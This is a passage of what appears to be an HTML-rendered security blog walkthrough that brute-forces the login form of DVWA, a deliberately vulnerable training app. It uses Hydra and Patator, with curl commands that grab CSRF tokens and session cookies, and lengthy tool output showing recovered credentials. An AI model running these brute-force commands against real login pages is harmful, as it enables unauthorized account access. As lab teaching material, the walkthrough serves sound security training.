&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="s2"&gt;&amp;quot;/DVWA/vulnerabilities/brute/:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:F=Username and/or password incorrect.:H=Cookie\: security=medium; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra v8.1 &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span class="k"&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class="k"&gt;for&lt;/span&gt; illegal purposes.
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; starting at 2015-10-30 21:42:01
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFORMATION&lt;span class="o"&gt;]&lt;/span&gt; escape sequence &lt;span class="se"&gt;\:&lt;/span&gt; detected in module option, no parameter verification is performed.
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; max &lt;span class="m"&gt;5&lt;/span&gt; tasks per &lt;span class="m"&gt;1&lt;/span&gt; server, overall &lt;span class="m"&gt;64&lt;/span&gt; tasks, &lt;span class="m"&gt;157788400&lt;/span&gt; login tries &lt;span class="o"&gt;(&lt;/span&gt;l:11/p:14344400&lt;span class="o"&gt;)&lt;/span&gt;, ~493088 tries per task
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; attacking service http-get-form on port 80
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;VERBOSE&lt;span class="o"&gt;]&lt;/span&gt; Resolving addresses ... &lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;STATUS&lt;span class="o"&gt;]&lt;/span&gt; 24.00 tries/min, &lt;span class="m"&gt;24&lt;/span&gt; tries in 00:01h, &lt;span class="m"&gt;157788376&lt;/span&gt; todo in 109575:16h, &lt;span class="m"&gt;5&lt;/span&gt; active
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;80&lt;span class="o"&gt;][&lt;/span&gt;http-get-form&lt;span class="o"&gt;]&lt;/span&gt; host: 192.168.1.44   login: admin   password: password
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;STATUS&lt;span class="o"&gt;]&lt;/span&gt; attack finished &lt;span class="k"&gt;for&lt;/span&gt; 192.168.1.44 &lt;span class="o"&gt;(&lt;/span&gt;valid pair found&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; target successfully completed, &lt;span class="m"&gt;1&lt;/span&gt; valid password found
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; finished at 2015-10-30 21:44:55
&lt;/span&gt;&lt;span class="line"&gt;hydra -L /usr/share/seclists/Usernames/top_shortlist.txt -P  -e ns -F -u -t &lt;span class="m"&gt;5&lt;/span&gt;  1.47s user 0.41s system 1% cpu 2:54.26 total
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="hydra attack" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-medium-08.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="L.strong.Patator..strong."&gt;&lt;/a&gt;
&lt;h3&gt;&lt;strong&gt;Patator&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;We are using the same arguments as in the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;low level&lt;/a&gt;, however their values may be different.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Debug/Test command&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;(&lt;code&gt;1 thread&lt;/code&gt; * &lt;code&gt;3 seconds sleep&lt;/code&gt;) + &lt;code&gt;2 seconds leeway&lt;/code&gt; = &lt;code&gt;5 seconds wait time&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;


&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# echo -n 'admin\n\npassword' &amp;gt; /root/password.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# patator  http_fuzz  method=GET \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.44/DVWA/vulnerabilities/brute/?username=admin&amp;amp;password=FILE0&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/root/password.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cookie: security=medium; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;http_proxy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;127.0.0.1:8080 &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  --threads&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;  &lt;span class="nv"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -x quit:fgrep!&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'Username and/or password incorrect.'&lt;/span&gt;,clen!&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'-1'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;20:39:18 patator    INFO - Starting Patator v0.5 &lt;span class="o"&gt;(&lt;/span&gt;http://code.google.com/p/patator/&lt;span class="o"&gt;)&lt;/span&gt; at 2015-10-30 20:39 GMT
&lt;/span&gt;&lt;span class="line"&gt;20:39:18 patator    INFO -
&lt;/span&gt;&lt;span class="line"&gt;20:39:18 patator    INFO - code size:clen     &lt;span class="p"&gt;|&lt;/span&gt; candidate                        &lt;span class="p"&gt;|&lt;/span&gt;   num &lt;span class="p"&gt;|&lt;/span&gt; mesg
&lt;/span&gt;&lt;span class="line"&gt;20:39:18 patator    INFO - ----------------------------------------------------------------------
&lt;/span&gt;&lt;span class="line"&gt;20:39:21 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; admin                            &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:39:24 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt;                                  &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:39:24 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5285:5016     &lt;span class="p"&gt;|&lt;/span&gt; password                         &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:39:24 patator    INFO - Hits/Done/Skip/Fail/Size: 3/3/0/0/3, Avg: &lt;span class="m"&gt;0&lt;/span&gt; r/s, Time: 0h 0m 6s
&lt;/span&gt;&lt;span class="line"&gt;20:39:24 patator    INFO - To resume execution, pass --resume 3
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Patator" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-medium-14.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Main Command&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;(&lt;code&gt;5 threads&lt;/code&gt; * &lt;code&gt;3 seconds sleep&lt;/code&gt;) + &lt;code&gt;2 seconds safe net&lt;/code&gt; = &lt;code&gt;17 seconds wait time&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;


&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;span class="line-number"&gt;38&lt;/span&gt;
&lt;span class="line-number"&gt;39&lt;/span&gt;
&lt;span class="line-number"&gt;40&lt;/span&gt;
&lt;span class="line-number"&gt;41&lt;/span&gt;
&lt;span class="line-number"&gt;42&lt;/span&gt;
&lt;span class="line-number"&gt;43&lt;/span&gt;
&lt;span class="line-number"&gt;44&lt;/span&gt;
&lt;span class="line-number"&gt;45&lt;/span&gt;
&lt;span class="line-number"&gt;46&lt;/span&gt;
&lt;span class="line-number"&gt;47&lt;/span&gt;
&lt;span class="line-number"&gt;48&lt;/span&gt;
&lt;span class="line-number"&gt;49&lt;/span&gt;
&lt;span class="line-number"&gt;50&lt;/span&gt;
&lt;span class="line-number"&gt;51&lt;/span&gt;
&lt;span class="line-number"&gt;52&lt;/span&gt;
&lt;span class="line-number"&gt;53&lt;/span&gt;
&lt;span class="line-number"&gt;54&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie &amp;quot;192.168.1.44/DVWA/login.php&amp;quot; | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | cut -d $'\t' -f7)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b dvwa.cookie -d &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;192.168.1.44/DVWA/login.php&amp;quot; &amp;gt;/dev/null&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# time  patator  http_fuzz  method=GET \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.44/DVWA/vulnerabilities/brute/?username=FILE1&amp;amp;password=FILE0&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Usernames/top_shortlist.txt  &lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Passwords/rockyou.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cookie: security=medium; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  --threads&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;  &lt;span class="nv"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -x quit:fgrep!&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'Username and/or password incorrect.'&lt;/span&gt;,clen!&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'-1'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;20:40:03 patator    INFO - Starting Patator v0.5 &lt;span class="o"&gt;(&lt;/span&gt;http://code.google.com/p/patator/&lt;span class="o"&gt;)&lt;/span&gt; at 2015-10-30 20:40 GMT
&lt;/span&gt;&lt;span class="line"&gt;20:40:04 patator    INFO -
&lt;/span&gt;&lt;span class="line"&gt;20:40:04 patator    INFO - code size:clen     &lt;span class="p"&gt;|&lt;/span&gt; candidate                        &lt;span class="p"&gt;|&lt;/span&gt;   num &lt;span class="p"&gt;|&lt;/span&gt; mesg
&lt;/span&gt;&lt;span class="line"&gt;20:40:04 patator    INFO - ----------------------------------------------------------------------
&lt;/span&gt;&lt;span class="line"&gt;20:40:07 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5310:5041     &lt;span class="p"&gt;|&lt;/span&gt; 123456:info                      &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;5&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:10 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456:test                      &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:13 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456:root                      &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:16 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456:guest                     &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:20 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456:admin                     &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:23 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456:oracle                    &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:26 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456:user                      &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;8&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:29 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456:adm                       &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;6&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:32 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456:administrator             &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;9&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:35 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456:mysql                     &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;7&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:38 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 12345:guest                      &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:41 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 12345:admin                      &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;13&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:44 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456:ftp                       &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;11&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:47 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 12345:test                       &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:50 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 12345:root                       &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;12&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:53 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 12345:administrator              &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:56 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 12345:mysql                      &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;18&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:40:59 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 12345:info                       &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;16&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:02 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 12345:user                       &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;19&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:05 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 12345:adm                        &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:08 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456789:test                   &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;25&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:11 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456789:root                   &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;23&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:14 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 12345:oracle                     &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;21&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:17 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 123456789:admin                  &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;20:41:20 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5223:4954     &lt;span class="p"&gt;|&lt;/span&gt; 12345:ftp                        &lt;span class="p"&gt;|&lt;/span&gt;    &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
